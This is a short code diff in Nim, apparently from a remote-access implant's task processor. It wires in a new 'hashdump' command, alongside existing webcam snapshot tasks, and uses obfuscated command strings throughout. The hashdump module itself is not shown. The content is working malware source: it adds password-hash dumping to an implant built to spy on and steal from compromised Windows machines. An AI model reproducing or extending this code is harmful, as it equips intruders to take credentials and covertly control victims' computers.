@@ -143,6 +143,9 @@ when defined(windows):
   when defined(cmd_webcam_list) or defined(cmd_webcam_snap):
     import ../tasks/webcam
 
+when defined(cmd_hashdump):
+  import ../tasks/hashdump
+
 type
   TaskExecutionResult* = object
     response*: JsonNode
@@ -915,6 +918,11 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
             obf("status"): "error",
             obf("user_output"): obf("webcam_snap command is only available on Windows")
           }
+    
+    of obf("hashdump"):
+      when defined(cmd_hashdump):
+        debugLog "task_processor", "Executing hashdump command"
+        result.response = hashdump(taskId, params)
     
     else:
       # Command not implemented
